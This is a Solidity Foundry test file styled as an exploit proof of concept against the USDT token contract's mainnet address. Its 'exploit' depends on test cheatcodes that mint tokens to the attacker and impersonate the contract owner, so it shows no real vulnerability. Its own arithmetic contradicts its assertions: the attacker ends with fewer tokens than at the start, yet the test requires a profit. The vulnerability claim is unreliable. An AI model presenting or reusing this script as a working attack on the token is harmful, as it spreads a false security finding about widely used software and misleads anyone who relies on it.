// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface TetherToken {
    function owner() external view returns (address);
    function balanceOf(address who) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external;
    function paused() external view returns (bool);
    function isBlackListed(address _maker) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);
    address owner; // Declare owner as a state variable


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get owner address and ensure contract is not paused
        owner = TetherToken(TARGET).owner(); // Assign to state variable
        vm.label(owner, "Contract Owner");

        // Give attacker some initial tokens
        deal(TARGET, attacker, 1000 * 10**6); // USDT has 6 decimals

        // Ensure contract is not paused - we'll assume it's not
        // Ensure attacker is not blacklisted - we'll assume not
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        // Step 1: Impersonate owner to set fee parameters
        vm.startPrank(owner);
        TetherToken(TARGET).setParams(100, 10); // 1% fee, max 10 tokens
        vm.stopPrank();

        // Record initial balances
        uint256 initialAttackerBalance = TetherToken(TARGET).balanceOf(attacker);
        uint256 initialOwnerBalance = TetherToken(TARGET).balanceOf(owner);
        uint256 initialTotalSupply = TetherToken(TARGET).totalSupply();

        console.log("Initial attacker balance:", initialAttackerBalance);
        console.log("Initial owner balance:", initialOwnerBalance);
        console.log("Initial total supply:", initialTotalSupply);

        // Step 2: Make a transfer to generate fees
        // Transfer 100 tokens (with 6 decimals)
        uint256 transferAmount = 100 * 10**6;
        TetherToken(TARGET).transfer(address(0x123), transferAmount);

        // Calculate expected fee: 1% of 100 = 1 token (capped at max fee of 10)
        uint256 expectedFee = 1 * 10**6;

        // Step 3: Check owner received the fee
        uint256 newOwnerBalance = TetherToken(TARGET).balanceOf(owner);
        uint256 ownerBalanceIncrease = newOwnerBalance - initialOwnerBalance;
        console.log("Owner balance increase (fee collected):", ownerBalanceIncrease);
        require(ownerBalanceIncrease == expectedFee, "Owner should have received fee");

        // Step 4: Owner transfers collected fee to attacker
        vm.prank(owner);
        TetherToken(TARGET).transfer(attacker, ownerBalanceIncrease);

        // Step 5: Verify attacker's balance increased
        uint256 finalAttackerBalance = TetherToken(TARGET).balanceOf(attacker);
        uint256 finalTotalSupply = TetherToken(TARGET).totalSupply();

        console.log("Final attacker balance:", finalAttackerBalance);
        console.log("Final total supply:", finalTotalSupply);
        console.log("Attacker profit:", finalAttackerBalance - initialAttackerBalance);

        // The vulnerability: total supply didn't change but attacker got tokens
        require(finalTotalSupply == initialTotalSupply, "Total supply should not change");
        require(finalAttackerBalance > initialAttackerBalance, "Attacker balance should increase");
        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
